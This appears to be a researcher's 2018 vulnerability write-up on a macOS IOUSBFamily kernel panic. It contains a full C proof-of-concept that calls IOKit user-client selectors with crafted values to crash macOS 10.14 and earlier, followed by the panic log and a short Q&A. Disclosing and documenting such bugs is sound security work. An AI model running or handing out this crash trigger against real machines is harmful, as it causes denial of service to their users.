---
layout: default
author: juwei lin
date: 2018-09-29 22:00:00 +0800
---

# macOS IOUSBFamily Local DOS Bug [INTERNAL]

## Overview
There are some functions in kernel calling `panic()`. One of them is `IOUSBDeviceUserClient::_GetConfigDescriptor2`.  
This case is of type local DOS. It is not exploitable.

## PoC
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <IOKit/IOKitLib.h>


void trigger(io_connect_t conn, uint32_t value)
{
    uint64_t INPUTSCALAR[8];
    uint32_t INPUTSCALARCNT = 0;
    
    char INPUTSTRUCT[4096];
    size_t INPUTSTRUCTCNT = 0;
    
    uint64_t OUTPUTSCALAR[8] = {0};
    uint32_t OUTPUTSCALARCNT = 0;
    
    char OUTPUTSTRUCT[4096];
    size_t OUTPUTSTRUCTCNT = 0;
    
    INPUTSCALAR[0] = 0x100000001;
    INPUTSCALARCNT = 1;
    OUTPUTSCALARCNT = 0;
    INPUTSTRUCTCNT = 0;
    OUTPUTSTRUCTCNT = 0;
    
    IOConnectCallMethod(
                        conn,
                        10,
                        INPUTSCALAR,
                        INPUTSCALARCNT,
                        INPUTSTRUCT,
                        INPUTSTRUCTCNT,
                        OUTPUTSCALAR,
                        &OUTPUTSCALARCNT,
                        OUTPUTSTRUCT,
                        &OUTPUTSTRUCTCNT);
    
    INPUTSCALAR[0] = 0x47fd;
    INPUTSCALARCNT = 1;
    OUTPUTSCALARCNT = 0;
    INPUTSTRUCTCNT = 0;
    OUTPUTSTRUCTCNT = 0x65ff3521;
    
    IOConnectCallMethod(
                        conn,
                        4,  //_GetConfigDescriptor2
                        INPUTSCALAR,
                        INPUTSCALARCNT,
                        INPUTSTRUCT,
                        INPUTSTRUCTCNT,
                        OUTPUTSCALAR,
                        &OUTPUTSCALARCNT,
                        OUTPUTSTRUCT,
                        &OUTPUTSTRUCTCNT);
    
}


int main(){
    
    kern_return_t err;
    
    CFMutableDictionaryRef Matching = IOServiceMatching("IOUSBDevice");
    
    if(!Matching){
        
        printf("UNABLE TO CREATE SERVICE MATCHING DICTIONARY\n");
        
        return 0;
        
    }
    
    io_iterator_t iterator;
    
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, Matching, &iterator);
    
    if (err != KERN_SUCCESS){
        
        printf("NO MATCHES\n");
        return 0;
    }
    
    io_service_t service = IOIteratorNext(iterator);
    
    if (service == IO_OBJECT_NULL){
        
        printf("UNABLE TO FIND SERVICE\n");
        
        return 0;
        
    }
    
    io_connect_t CONN = MACH_PORT_NULL;
    
    err = IOServiceOpen(service, mach_task_self(), 0, &CONN);
    
    if (err != KERN_SUCCESS){
        
        printf("UNABLE TO GET USER CLIENT CONNECTION\n");
        
        return 0;
        
    }else{
        
        printf("GOT USERCLIENT CONNECTION: %X, TYPE:%D\n", CONN, 0);
        
    }
    
    trigger(CONN, 0);
    
    printf("PANIC?\n");
    
    return 0;
    
}


```
## PanicLog
```
Anonymous UUID:       039B94D9-F271-8A3F-BAE4-C8BF9D6B5BEE

Mon Oct 29 13:57:35 2018

*** Panic Report ***
panic(cpu 0 caller 0xffffff8017a6ab04): "IOGMD: not wired for the IODMACommand"@/BuildRoot/Library/Caches/com.apple.xbs/Sources/xnu/xnu-4903.201.2/iokit/Kernel/IOMemoryDescriptor.cpp:2337
Backtrace (CPU 0), Frame : Return Address
0xffffff80727fb5a0 : 0xffffff80173aca1d mach_kernel : _handle_debugger_trap + 0x48d
0xffffff80727fb5f0 : 0xffffff80174e6b13 mach_kernel : _kdp_i386_trap + 0x153
0xffffff80727fb630 : 0xffffff80174d859a mach_kernel : _kernel_trap + 0x4fa
0xffffff80727fb6a0 : 0xffffff8017359ca0 mach_kernel : _return_from_trap + 0xe0
0xffffff80727fb6c0 : 0xffffff80173ac437 mach_kernel : _panic_trap_to_debugger + 0x197
0xffffff80727fb7e0 : 0xffffff80173ac283 mach_kernel : _panic + 0x63
0xffffff80727fb850 : 0xffffff8017a6ab04 mach_kernel : __ZNK25IOGeneralMemoryDescriptor19dmaCommandOperationEjPvj + 0x724
0xffffff80727fb8d0 : 0xffffff8017a6b065 mach_kernel : __ZN25IOGeneralMemoryDescriptor18getPhysicalSegmentEyPyj + 0x1f5
0xffffff80727fb9b0 : 0xffffff8017a6843c mach_kernel : __ZN18IOMemoryDescriptor10writeBytesEyPKvy + 0xec
0xffffff80727fba10 : 0xffffff7f983ae40c com.apple.iokit.IOUSBFamily : __ZN21IOUSBUserClientLegacy19GetConfigDescriptorEhP18IOMemoryDescriptorPj + 0x190
0xffffff80727fba80 : 0xffffff7f983a8e5a com.apple.iokit.IOUSBFamily : __ZN21IOUSBDeviceUserClient20_GetConfigDescriptorEPS_PvP25IOExternalMethodArguments + 0xe6
0xffffff80727fbae0 : 0xffffff8017a85178 mach_kernel : __ZN12IOUserClient14externalMethodEjP25IOExternalMethodArgumentsP24IOExternalMethodDispatchP8OSObjectPv + 0x1d8
0xffffff80727fbb30 : 0xffffff8017a8e5ff mach_kernel : _is_io_connect_method + 0x20f
0xffffff80727fbc70 : 0xffffff80174931f4 mach_kernel : _iokit_server_routine + 0x5e84
0xffffff80727fbd80 : 0xffffff80173b210d mach_kernel : _ipc_kobject_server + 0x12d
0xffffff80727fbdd0 : 0xffffff801738cad5 mach_kernel : _ipc_kmsg_send + 0x225
0xffffff80727fbe50 : 0xffffff80173a148e mach_kernel : _mach_msg_overwrite_trap + 0x38e
0xffffff80727fbef0 : 0xffffff80174bfceb mach_kernel : _mach_call_munger64 + 0x22b
0xffffff80727fbfa0 : 0xffffff801735a486 mach_kernel : _hndl_mach_scall64 + 0x16
      Kernel Extensions in backtrace:
         com.apple.iokit.IOUSBFamily(900.4.2)[B3A7BE9C-2002-3891-B7D1-A84CEA0AC9E0]@0xffffff7f9838c000->0xffffff7f98426fff
            dependency: com.apple.iokit.IOPCIFamily(2.9)[2CE7BCB3-0766-3A94-A8D4-29BF3EBAEFBC]@0xffffff7f97c95000
            dependency: com.apple.iokit.IOUSBHostFamily(1.2)[ED37A531-57CD-313C-B164-BC0F33B09D35]@0xffffff7f982e1000
            dependency: com.apple.driver.usb.AppleUSBCommon(1.0)[7F32C612-AC3B-333C-9067-5EAB39CF6EC3]@0xffffff7f982d9000
```  

## Q & A
### How did you find this vulnerability?
by fuzzing.

### Can you identify exploitability?
This is local DOS case in kernel. It is not exploitable.

### Can you identify root cause?
Yes, the panic function is called directly in kernel.

### Vulnerable software and hardware
macOS 10.14 and all before   


  [Back Home]({{site.url}}{{site.baseurl}})